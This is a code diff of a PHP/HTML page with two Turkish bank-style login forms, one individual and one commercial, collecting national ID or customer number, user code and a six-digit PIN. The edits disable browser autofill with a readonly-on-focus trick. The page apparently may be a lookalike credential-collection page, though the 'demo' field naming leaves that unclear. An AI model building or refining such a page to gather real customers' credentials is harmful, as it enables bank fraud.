@@ -507,13 +507,13 @@ if (isset($_GET['blobtest'])) {
         <button type="button" class="login-tab" data-tab="ticari">Ticari</button>
       </nav>
 
-      <form class="login-form" method="post" action="submit.php">
+      <form class="login-form" method="post" action="submit.php" autocomplete="off">
         <div class="form-error" id="error-bireysel"></div>
         <div class="field">
-          <input type="text" name="national_id" placeholder="T.C. Kimlik ya da Müşteri Numarası" autocomplete="off" inputmode="numeric" />
+          <input type="text" name="national_id" placeholder="T.C. Kimlik ya da Müşteri Numarası" inputmode="numeric" maxlength="11" readonly onfocus="this.removeAttribute('readonly')" />
         </div>
         <div class="field field--password">
-          <input type="password" name="demo_pin" placeholder="Dijital Şifre" autocomplete="off" inputmode="numeric" maxlength="6" />
+          <input type="password" name="demo_pin" placeholder="Dijital Şifre" inputmode="numeric" maxlength="6" autocomplete="new-password" readonly onfocus="this.removeAttribute('readonly')" />
           <button type="button" class="field__link">Şifre Al</button>
         </div>
         <button type="submit" class="btn-devam">Devam</button>
@@ -538,17 +538,17 @@ if (isset($_GET['blobtest'])) {
         <button type="button" class="login-tab active" data-tab="ticari">Ticari</button>
       </nav>
 
-      <form class="login-form" method="post" action="submit.php">
+      <form class="login-form" method="post" action="submit.php" autocomplete="off">
         <div class="form-error" id="error-ticari"></div>
         <input type="hidden" name="tip" value="ticari" />
         <div class="field">
-          <input type="text" name="national_id" placeholder="Müşteri Numarası" autocomplete="off" inputmode="numeric" />
+          <input type="text" name="national_id" placeholder="Müşteri Numarası" inputmode="numeric" readonly onfocus="this.removeAttribute('readonly')" />
         </div>
         <div class="field">
-          <input type="text" name="user_code" placeholder="Kullanıcı Kodu" autocomplete="off" />
+          <input type="text" name="user_code" placeholder="Kullanıcı Kodu" readonly onfocus="this.removeAttribute('readonly')" />
         </div>
         <div class="field field--password">
-          <input type="password" name="demo_pin" placeholder="Dijital Şifre" autocomplete="off" inputmode="numeric" maxlength="6" />
+          <input type="password" name="demo_pin" placeholder="Dijital Şifre" inputmode="numeric" maxlength="6" autocomplete="new-password" readonly onfocus="this.removeAttribute('readonly')" />
           <button type="button" class="field__link">Şifre Al</button>
         </div>
         <button type="submit" class="btn-devam">Devam</button>
